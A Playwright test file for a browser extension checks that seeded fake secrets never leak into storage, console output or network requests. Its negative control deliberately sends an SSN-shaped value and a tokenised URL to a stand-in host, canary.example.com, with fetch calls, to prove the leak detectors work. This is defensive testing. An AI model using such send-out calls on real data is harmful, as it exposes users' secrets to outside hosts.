/**
 * @mandatory — Hard Rules 2 and 10: derived facts only; never log secrets.
 *
 * Every seeded secret (tests/fixtures/secrets/seeded.json) is injected into the fixture pages the
 * extension sees. After a session, no seed value or canary fragment may appear in: the extension's
 * own ledger export, any IndexedDB database, any chrome.storage area, console output from any context,
 * or any network URL or body (telemetry included, from Sprint 5). Later sprints extend the page list
 * with real vendor fixtures and add the share output; the channels stay. The negative control plants
 * a seed in each channel and proves the collectors catch it. Never skipped, retried, or weakened.
 */
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';

import { expect, test } from '@playwright/test';
import type { WxtBrowser } from 'wxt/browser';

import { startFixtureServer } from '../tools/serve-fixtures';
import { collectStorageChannels, recordConsole, type StorageChannels } from './support/channels';
import { launchExtension } from './support/extension';
import { findLeaks, type Leak, loadSeeds, type Seed } from './support/leaks';
import { parseNetLog, urlRequests } from './support/netlog';
import { guardArgs, installRouteGuard, type RouteRecord } from './support/network-guard';
import { injectSeeds } from './support/seed-pages';

declare const chrome: WxtBrowser;

const SEEDS = loadSeeds();
const SEEDED_PAGES = ['_harness/blank.html', '_harness/mail-like.html', '_harness/calendar-like.html'];
const EXTENSION_PAGES = ['popup.html', 'options.html', 'sidepanel.html'];
const SETTLE_MS = 5_000;

interface Collected {
  readonly storage: StorageChannels;
  readonly consoleLines: readonly string[];
  readonly routeRecords: readonly RouteRecord[];
  readonly netLogUrls: readonly string[];
}

function allLeaks(collected: Collected, seeds: readonly Seed[]): Leak[] {
  return [
    ...findLeaks('ledger-export', collected.storage.ledgerExport, seeds),
    ...findLeaks('indexeddb', collected.storage.indexedDb, seeds),
    ...findLeaks('chrome-storage', collected.storage.storage, seeds),
    ...findLeaks('console', collected.consoleLines, seeds),
    ...findLeaks(
      'network',
      [...collected.netLogUrls, ...collected.routeRecords.map((r) => `${r.url} ${r.body}`)],
      seeds,
    ),
  ];
}

/** Runs `act` inside a guarded extension session and returns everything every channel holds. */
async function collectAfter(
  act: (ctx: {
    extension: Awaited<ReturnType<typeof launchExtension>>;
    seededUrl: (page: string) => string;
  }) => Promise<void>,
): Promise<Collected> {
  const server = await startFixtureServer();
  const dir = mkdtempSync(path.join(os.tmpdir(), 'attest-noleak-'));
  const netLogPath = path.join(dir, 'netlog.json');
  const routedFixtures = new Map<string, string>();
  const seededUrl = (page: string) => server.url(`_seeded/${page}`);
  for (const page of SEEDED_PAGES) {
    routedFixtures.set(
      seededUrl(page),
      injectSeeds(readFileSync(path.join(import.meta.dirname, '../fixtures/pages', page), 'utf8'), SEEDS),
    );
  }
  const extension = await launchExtension({ extraArgs: guardArgs(netLogPath) });
  const routeRecords = await installRouteGuard(extension.context, {
    fixtureOrigin: server.origin,
    routedFixtures,
  });
  const consoleLines: string[] = [];
  recordConsole(await extension.serviceWorker(), 'service-worker', consoleLines);
  extension.context.on('page', (page) => {
    recordConsole(page, page.url() || 'page', consoleLines);
  });
  let storage: StorageChannels;
  try {
    await act({ extension, seededUrl });
    const probe = await extension.openExtensionPage('options.html');
    storage = await collectStorageChannels(probe);
  } finally {
    await extension.close();
    await server.close();
  }
  const netLogUrls = urlRequests(parseNetLog(readFileSync(netLogPath, 'utf8'))).map((r) => r.url);
  rmSync(dir, { recursive: true, force: true });
  return { storage, consoleLines, routeRecords, netLogUrls };
}

test.describe('no seeded secret leaks', { tag: '@mandatory' }, () => {
  test('seeded pages leave no trace in export, IndexedDB, storage, console, or network', async () => {
    test.setTimeout(3 * 60_000);
    const collected = await collectAfter(async ({ extension, seededUrl }) => {
      for (const page of SEEDED_PAGES) {
        const tab = await extension.context.newPage();
        await tab.goto(seededUrl(page));
        // The seeds really are on the page the extension sees.
        await expect(tab.locator('[data-attest-seeded]')).toHaveCount(SEEDS.length);
      }
      for (const page of EXTENSION_PAGES) await extension.openExtensionPage(page);
      await new Promise((resolve) => setTimeout(resolve, SETTLE_MS));
    });

    // Every channel was actually read: an unreadable channel must never pass as "no leaks".
    expect(collected.storage.ledgerExport).toMatchObject({
      type: 'ui.result',
      kind: 'ledger.export',
      ok: true,
    });
    expect(Object.keys(collected.storage.indexedDb)).toContain('attest');
    expect(collected.storage.storage).toHaveProperty('local');
    expect(collected.consoleLines.some((line) => line.startsWith('service-worker'))).toBe(true);

    const leaks = allLeaks(collected, SEEDS);
    for (const leak of leaks)
      console.log(`[no-leak] LEAK seed=${leak.seedId} channel=${leak.channel} at=${leak.location}`);
    expect(leaks).toEqual([]);
  });

  test('negative control: a seed planted in each channel is caught', async () => {
    test.setTimeout(2 * 60_000);
    const seed = (id: string): Seed => {
      const found = SEEDS.find((s) => s.id === id);
      if (!found) throw new Error(`seed ${id} missing from seeded.json`);
      return found;
    };
    const apiKey = seed('api_key_openai_shape');
    const name = seed('person_name_1');
    const body = seed('email_body_2');
    const ssn = seed('ssn_shape');
    const token = seed('url_with_token');
    const collected = await collectAfter(async ({ extension }) => {
      const page = await extension.openExtensionPage('options.html');
      // chrome.storage
      await page.evaluate((value) => chrome.storage.local.set({ probe: value }), apiKey.value);
      // the ledger (via its export) and raw IndexedDB: open the ledger through the export, then write a row
      await page.evaluate(() =>
        chrome.runtime.sendMessage({ type: 'ui.query', query: { kind: 'ledger.export' } }),
      );
      await page.evaluate(async (value) => {
        await new Promise<void>((resolve, reject) => {
          const open = indexedDB.open('attest');
          open.onsuccess = () => {
            const tx = open.result.transaction('meta', 'readwrite');
            tx.objectStore('meta').put({ key: 'probe', value });
            tx.oncomplete = () => {
              open.result.close();
              resolve();
            };
            tx.onerror = () => {
              reject(new Error('probe write failed'));
            };
          };
          open.onerror = () => {
            reject(new Error('probe open failed'));
          };
        });
      }, name.value);
      // console, from the service worker
      const worker = await extension.serviceWorker();
      await worker.evaluate((value) => {
        console.info(value);
      }, body.value);
      // network
      await page.evaluate(
        (value) => fetch(`https://canary.example.com/?q=${encodeURIComponent(value)}`).catch(() => undefined),
        token.value,
      );
      await page.evaluate(
        (value) =>
          fetch('https://canary.example.com/', { method: 'POST', body: value }).catch(() => undefined),
        ssn.value,
      );
    });
    const caught = new Set(allLeaks(collected, SEEDS).map((leak) => `${leak.channel}:${leak.seedId}`));
    expect(caught).toContain(`chrome-storage:${apiKey.id}`);
    expect(caught).toContain(`indexeddb:${name.id}`);
    expect(caught).toContain(`ledger-export:${name.id}`);
    expect(caught).toContain(`console:${body.id}`);
    expect(caught).toContain(`network:${token.id}`);
    expect(caught).toContain(`network:${ssn.id}`);
  });
});
